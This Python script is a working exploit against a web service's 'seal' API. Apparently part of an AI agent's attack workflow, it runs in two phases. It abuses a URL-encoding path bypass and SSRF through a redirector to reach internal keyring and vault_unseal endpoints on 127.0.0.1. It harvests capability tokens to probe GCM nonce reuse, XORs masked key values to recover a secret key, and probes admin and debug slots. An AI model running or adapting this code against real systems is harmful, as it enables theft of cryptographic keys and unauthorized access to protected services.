#!/usr/bin/env python3
"""
Scope C + D batch for the wire driver. Small, paced, everything saved.

C  nonce structure: 12 more caps, then look for a fixed constant, a constant
   byte position, or a counter. VK_CAP_IV reuse is already refuted 4/4, this is
   the low-entropy fallback.
D  cap.key hunt. cap.key is NOT on the renderer redaction list, so anything
   key-derived that reaches a response renders in the clear. Three questions
   the previous agents never asked:
     D1 is `unseal_ref` stable across calls, or fresh each time?
     D2 does `cap_key_masked` change between two calls with the SAME ref?
        if it does, the mask is per-call and two samples give mask1^mask2
     D3 does vault_unseal expose any other slot, and does keyring look
        different when the peer address differs?
"""
import argparse
import base64
import json
import os
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import gcm  # noqa: E402

ART = os.path.join(HERE, "..", "artifacts", "wire")
S = requests.Session()
S.headers["User-Agent"] = "Mozilla/5.0"


def save(name, text):
    os.makedirs(ART, exist_ok=True)
    with open(os.path.join(ART, name), "w") as f:
        f.write(text if isinstance(text, str) else json.dumps(text, indent=1))


def bypass(base, script, query=""):
    u = "%s/api/%s.php%%3Fa.php" % (base.rstrip("/"), script)
    return u + ("?" + query if query else "")


def ssrf_get(base, redir, target):
    url = bypass(base, "fetch_source", "url=" + requests.utils.quote(
        redir.rstrip("/") + "/r/" + target, safe=""))
    r = S.get(url, timeout=45)
    try:
        j = r.json()
    except Exception:
        return "NONJSON %d %s" % (r.status_code, r.text[:300])
    return j.get("trace", "NOTRACE " + r.text[:300])


def phase_c(base, n, delay):
    print("=== C: nonce structure, %d more caps ===" % n)
    samples = []
    for i in range(n):
        try:
            if i % 2 == 0:
                c = S.get(base + "/api/status.php", timeout=20).json()["read_capability"]
                samples.append(("viewer/%d" % i, c))
            else:
                c = S.post(base + "/api/request_restore.php",
                           json={"source_label": "x"}, timeout=20).json()["cap"]
                samples.append(("guest/%d" % i, c))
        except Exception as e:
            print("  fetch failed: %s" % e)
        time.sleep(delay)
    save("caps_remote.json", samples)
    if len(samples) < 2:
        return
    gcm.analyse(samples)
    ivs = [gcm.parse_cap(c)[0] for _, c in samples]
    ints = sorted(int.from_bytes(v, "big") for v in ivs)
    gaps = [b - a for a, b in zip(ints, ints[1:])]
    print("[C] min gap between sorted nonces: %d (random 96-bit expects ~2^92)"
          % (min(gaps) if gaps else -1))
    # per-byte value spread
    for i in range(12):
        vals = {v[i] for v in ivs}
        if len(vals) <= max(2, len(ivs) // 3):
            print("[C] nonce byte %d has only %d distinct values: %s"
                  % (i, len(vals), sorted(vals)))


def phase_d(base, redir, delay):
    print("=== D: cap.key hunt on the deployed seal service ===")
    out = {}
    # D1 -- three keyring reads, are the refs stable?
    refs = []
    for i in range(3):
        body = ssrf_get(base, redir, "http://127.0.0.1/api/keyring.php")
        out["keyring_%d" % i] = body
        print("[D1] keyring %d: %s" % (i, body[:400].replace("\n", " ")))
        try:
            refs.append(json.loads(body).get("unseal_ref"))
        except Exception:
            pass
        time.sleep(delay)
    print("[D1] refs: %s  -> %s" % (refs, "STABLE" if len(set(refs)) == 1 else "FRESH EACH CALL"))

    ref = next((r for r in refs if r), None)
    if not ref:
        print("[D] no unseal_ref, aborting phase D")
        save("phase_d.json", out)
        return

    # D2 -- same ref twice, does the masking change?
    maskeds = []
    for i in range(3):
        body = ssrf_get(base, redir,
                        "http://127.0.0.1/api/vault_unseal.php?ref=" + ref)
        out["unseal_%d" % i] = body
        print("[D2] unseal %d: %s" % (i, body[:300].replace("\n", " ")))
        try:
            maskeds.append(json.loads(body).get("cap_key_masked"))
        except Exception:
            pass
        time.sleep(delay)
    uniq = set(m for m in maskeds if m)
    print("[D2] cap_key_masked distinct values: %d -> %s"
          % (len(uniq), "STATIC MASK" if len(uniq) == 1 else "PER-CALL MASK"))
    if len(uniq) > 1:
        vals = [base64.b64decode(m) for m in uniq]
        for a in range(len(vals)):
            for b in range(a + 1, len(vals)):
                x = bytes(p ^ q for p, q in zip(vals[a], vals[b]))
                print("[D2] mask_a ^ mask_b = %s  (%r)" % (x.hex(), x))

    # D3 -- try other slots / other refs
    for extra in ("?ref=%s&slot=maintainer" % ref,
                  "?ref=%s&slot=admin" % ref,
                  "?slot=operator",
                  "?ref=%s&raw=1" % ref,
                  "?ref=%s&debug=1" % ref,
                  "?ref=%s&unmasked=1" % ref):
        body = ssrf_get(base, redir, "http://127.0.0.1/api/vault_unseal.php" + extra)
        out["unseal" + extra] = body
        print("[D3] %-34s %s" % (extra, body[:200].replace("\n", " ")))
        time.sleep(delay)
    save("phase_d.json", out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--redir", default="")
    ap.add_argument("--caps", type=int, default=12)
    ap.add_argument("--delay", type=float, default=0.2)
    ap.add_argument("--only", default="cd")
    a = ap.parse_args()
    base = a.base.rstrip("/")
    if "c" in a.only:
        phase_c(base, a.caps, a.delay)
    if "d" in a.only and a.redir:
        phase_d(base, a.redir, a.delay)


if __name__ == "__main__":
    main()
